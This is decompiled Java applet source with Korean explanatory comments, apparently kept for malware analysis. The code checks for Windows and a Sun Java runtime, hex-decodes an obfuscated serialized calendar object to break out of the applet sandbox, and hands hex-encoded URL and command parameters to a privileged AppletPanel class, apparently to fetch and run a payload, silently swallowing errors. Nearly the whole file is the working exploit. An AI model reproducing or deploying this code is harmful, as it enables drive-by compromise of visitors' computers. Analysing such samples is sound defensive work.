// Decompiled by Jad v1.5.8g. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.kpdus.com/jad.html
// Decompiler options: packimports(3) 
// Source File Name:   Main.java

import java.applet.Applet;
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;

public class Main extends Applet
{

    public Main()
    {
    }

    public static byte[] PadSG6F(String s)
    {
        String s1 = s.replaceAll("h", "");
        byte abyte0[] = new byte[s1.length() / 2];
        for(int i = 0; i < s1.length(); i += 2)
            abyte0[i / 2] = (byte)((Character.digit(s1.charAt(i), 16) << 4) + Character.digit(s1.charAt(i + 1), 16));

        return abyte0;
    }

    private int passed()    
    { //운영체제와 자바벤터사 정보 체크
        String s = System.getProperty("os.name");
        String s1 = System.getProperty("java.vendor");
        if(s.indexOf("Windows") == -1)
            return 0;
        return s1.indexOf("Sun") != -1 ? 1 : 0;
    }

    //자바애플릿 시작부분
    public void init()
    {
        try
        {
            if(passed() == 1)
            { //자바벤더사가 Sun인 경우
                byte abyte0[] = PadSG6F("achedh00h05h73h72h00h1bh6ah61h76h61h2eh75h74h69h6ch2eh47h72h65h67h6fh72h69h61h6eh43h61h6ch65h6eh64h61h72h8fh3dhd7hd6he5hb0hd0hc1h02h00h01h4ah00h10h67h72h65h67h6fh72h69h61h6eh43h75h74h6fh76h65h72h78h72h00h12h6ah61h76h61h2eh75h74h69h6ch2eh43h61h6ch65h6eh64h61h72he6heah4dh1ehc8hdch5bh8eh03h00h0bh5ah00h0ch61h72h65h46h69h65h6ch64h73h53h65h74h49h00h0eh66h69h72h73h74h44h61h79h4fh66h57h65h65h6bh5ah00h09h69h73h54h69h6dh65h53h65h74h5ah00h07h6ch65h6eh69h65h6eh74h49h00h16h6dh69h6eh69h6dh61h6ch44h61h79h73h49h6eh46h69h72h73h74h57h65h65h6bh49h00h09h6eh65h78h74h53h74h61h6dh70h49h00h15h73h65h72h69h61h6ch56h65h72h73h69h6fh6eh4fh6eh53h74h72h65h61h6dh4ah00h04h74h69h6dh65h5bh00h06h66h69h65h6ch64h73h74h00h02h5bh49h5bh00h05h69h73h53h65h74h74h00h02h5bh5ah4ch00h04h7ah6fh6eh65h74h00h14h4ch6ah61h76h61h2fh75h74h69h6ch2fh54h69h6dh65h5ah6fh6eh65h3bh78h70h01h00h00h00h01h01h01h00h00h00h01h00h00h00h02h00h00h00h01h00h00h01h21h56h3ahfch0eh75h72h00h02h5bh49h4dhbah60h26h76heahb2ha5h02h00h00h78h70h00h00h00h11h00h00h00h01h00h00h07hd9h00h00h00h04h00h00h00h15h00h00h00h04h00h00h00h12h00h00h00h8ah00h00h00h02h00h00h00h03h00h00h00h01h00h00h00h04h00h00h00h10h00h00h00h11h00h00h00h22h00h00h02hdehfeh48h8ch00h00h00h00h00h75h72h00h02h5bh5ah57h8fh20h39h14hb8h5dhe2h02h00h00h78h70h00h00h00h11h01h01h01h01h01h01h01h01h01h01h01h01h01h01h01h01h01h73h72h00h18h6ah61h76h61h2eh75h74h69h6ch2eh53h69h6dh70h6ch65h54h69h6dh65h5ah6fh6eh65hfah67h5dh60hd1h5ehf5ha6h03h00h12h49h00h0ah64h73h74h53h61h76h69h6eh67h73h49h00h06h65h6eh64h44h61h79h49h00h0ch65h6eh64h44h61h79h4fh66h57h65h65h6bh49h00h07h65h6eh64h4dh6fh64h65h49h00h08h65h6eh64h4dh6fh6eh74h68h49h00h07h65h6eh64h54h69h6dh65h49h00h0bh65h6eh64h54h69h6dh65h4dh6fh64h65h49h00h09h72h61h77h4fh66h66h73h65h74h49h00h15h73h65h72h69h61h6ch56h65h72h73h69h6fh6eh4fh6eh53h74h72h65h61h6dh49h00h08h73h74h61h72h74h44h61h79h49h00h0eh73h74h61h72h74h44h61h79h4fh66h57h65h65h6bh49h00h09h73h74h61h72h74h4dh6fh64h65h49h00h0ah73h74h61h72h74h4dh6fh6eh74h68h49h00h09h73h74h61h72h74h54h69h6dh65h49h00h0dh73h74h61h72h74h54h69h6dh65h4dh6fh64h65h49h00h09h73h74h61h72h74h59h65h61h72h5ah00h0bh75h73h65h44h61h79h6ch69h67h68h74h5bh00h0bh6dh6fh6eh74h68h4ch65h6eh67h74h68h74h00h02h5bh42h78h72h00h12h6ah61h76h61h2eh75h74h69h6ch2eh54h69h6dh65h5ah6fh6eh65h31hb3he9hf5h77h44hacha1h02h00h01h4ch00h02h49h44h74h00h12h4ch6ah61h76h61h2fh6ch61h6eh67h2fh53h74h72h69h6eh67h3bh78h70h74h00h0eh41h6dh65h72h69h63h61h2fh44h61h77h73h6fh6eh00h36heeh80h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00hfeh48h8ch00h00h00h00h02h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h00h75h72h00h02h5bh42hachf3h17hf8h06h08h54he0h02h00h00h78h70h00h00h00h0ch1fh1ch1fh1eh1fh1eh1fh1fh1eh1fh1eh1fh77h0ah00h00h00h06h00h00h00h00h00h00h75h71h00h7eh00h06h00h00h00h02h00h00h00h00h00h00h00h00h78h73h72h00h0bh41h70h70h6ch65h74h50h61h6eh65h6ch1chach5dh54h8bh2ah3ah01h02h00h00h78h70h78hffhffhf4he2hf9h64hach00h0ah");
                ObjectInputStream objectinputstream = new ObjectInputStream(new ByteArrayInputStream(abyte0));
                Object obj = objectinputstream.readObject();
                if(obj != null && AppletPanel.instance != null)
                {
                    String s = getParameter("u");
                    if(s == null)
                        s = "";
                    byte abyte1[] = PadSG6F(s);
                    s = new String(abyte1);
                    String s1 = getParameter("c");
                    String s2 = getParameter("d");
                    AppletPanel.instance.BxSnX2j(s, s1, s2); //AppletPannel.class로 s, s1, s2파라미너트를 전달합니다.
                }
            }
        }
        catch(Exception exception) { }
    }

    private static final long serialVersionUID = 0x79c6e11a8c938967L;
}
